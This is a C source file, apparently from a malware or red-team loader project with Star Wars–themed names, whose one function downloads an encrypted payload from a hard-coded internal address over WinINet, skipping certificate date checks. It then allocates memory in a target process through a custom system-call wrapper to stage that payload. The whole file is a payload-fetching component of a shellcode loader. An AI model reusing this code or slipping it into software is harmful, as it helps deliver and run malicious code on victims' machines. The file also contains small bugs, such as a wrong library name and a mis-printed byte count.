//
// Created by j4ck on 10/13/23.
//

#include "Http.h"
#include "Dooku.h"
#include <stdio.h>
#include <wchar.h>
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininit.lib")

#define PAYLOAD_SIZE 276

BOOL InitConnection(IN HANDLE hProcess, IN OUT LPVOID lpBuffer) {

    HINTERNET	hInternet       = NULL;
    HINTERNET   hInternetFile   = NULL;

    DWORD		dwBytesRead     = 0;

    SIZE_T		sSize           = 276;     // Total payload size


    hInternet = InternetOpenW(NULL, 0, NULL, NULL, 0);
    if (hInternet == NULL) {
        wprintf(L"[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    // Opening a handle to the payload's URL
    hInternetFile = InternetOpenUrlW(hInternet, L"http://172.16.7.130:8081/encrypted.bin", NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hInternetFile == NULL) {
        wprintf(L"[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    wprintf(L"hInternetFile: %p\n", hInternetFile);

    // Allocating 16 bytes to the temp buffer
    NTSTATUS status = Instance->SithVirtualAlloc(hProcess, lpBuffer, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    wprintf(L"Allocated Memory: %X\n", status);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    wprintf(L"Allocated Memory at Address: %p\n", lpBuffer);

    // Dereference lpBuffer and copy payload
    if (!InternetReadFile(hInternetFile, *(LPVOID*)lpBuffer, sSize, &dwBytesRead)) {
        wprintf(L"[!] InternetReadFile Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    wprintf(L"Wrote %d bytes to buffer: %p \n", &dwBytesRead, lpBuffer);
    // Cleanup
    InternetCloseHandle(hInternet);
    InternetCloseHandle(hInternetFile);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    return TRUE;
}